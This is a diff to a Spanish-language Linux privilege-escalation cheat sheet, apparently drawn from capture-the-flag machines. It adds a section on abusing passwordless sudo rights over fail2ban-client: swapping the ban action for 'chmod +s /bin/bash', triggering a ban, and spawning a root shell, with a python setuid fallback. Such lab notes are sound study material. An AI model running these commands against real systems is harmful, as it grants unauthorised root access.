@@ -1,6 +1,6 @@
 # Escalada de privilegios Linux
 
-Técnicas usadas en **CACHOPO**, **ACEITUNO**, **Academia**, **GOIKO**, **BOLA**, **Domino** y **Monitor silencioso**.
+Técnicas usadas en **CACHOPO**, **ACEITUNO**, **Academia**, **GOIKO**, **BOLA**, **Domino**, **Monitor silencioso** y **Facturación**.
 
 ## 1. Punto de partida: enumeración
 
@@ -163,7 +163,24 @@ show tables;
 select * from <tabla>;
 ```
 
-## 9. Recoger las banderas
+## 9. Abuso de `fail2ban-client` con sudo
+
+Cuando `sudo -l` muestra `(ALL) NOPASSWD: /usr/bin/fail2ban-client` (caso de **Facturación**), Fail2Ban permite cambiar **en caliente** la acción que se ejecuta al banear una IP. La sustituimos por un comando propio, que se ejecutará como root:
+
+```
+sudo /usr/bin/fail2ban-client status
+sudo /usr/bin/fail2ban-client get asterisk-iptables actions
+sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
+sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
+sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
+/bin/bash -p
+```
+
+- `get ... actionban` muestra la acción original: `<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>`.
+- El `banip` dispara la acción modificada como root: `ls -l /bin/bash` debe pasar a `-rwsr-sr-x`.
+- `-p` conserva los IDs efectivos; si no basta, forzar con `python3 -c 'import os; import pty; os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")'`.
+
+## 10. Recoger las banderas
 
 ```
 cat user.txt
